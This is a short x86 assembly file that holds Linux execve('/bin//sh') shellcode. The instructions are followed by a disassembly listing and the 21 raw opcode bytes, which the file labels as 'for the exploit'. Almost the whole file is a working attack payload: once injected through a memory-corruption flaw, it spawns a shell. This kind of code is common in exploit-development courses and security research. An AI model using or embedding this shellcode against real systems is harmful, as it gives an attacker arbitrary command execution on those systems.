[bits 32]
    xor     ecx, ecx        ; get zero
    mul     ecx             ; zeroing out eax, edx too
    push    ecx             ; push a null byte to end string
    push    dword `//sh`    ; push filename to stack
    push    dword `/bin`
    mov     ebx, esp        ; get ptr to filename
    mov     al, 11          ; set code for execvi
    int     0x80            ; do the interrupt

; $ ndisasm -u shellcode
;            1 2 3 4 5 6
; ==============================================================================
; 00000000  31C9              xor ecx,ecx
; 00000002  F7E1              mul ecx
; 00000004  51                push ecx
; 00000005  682F2F7368        push dword 0x68732f2f
; 0000000A  682F62696E        push dword 0x6e69622f
; 0000000F  89E3              mov ebx,esp
; 00000011  B00B              mov al,0xb
; 00000013  CD80              int 0x80
; ==============================================================================
; 00000015                    total of 21 bytes 
;
; opcode bytes for the exploit
; 31 C9 F7 E1 51 68 2F 2F 73 68 68 2F 62 69 6E 89 E3 B0 0B CD 80
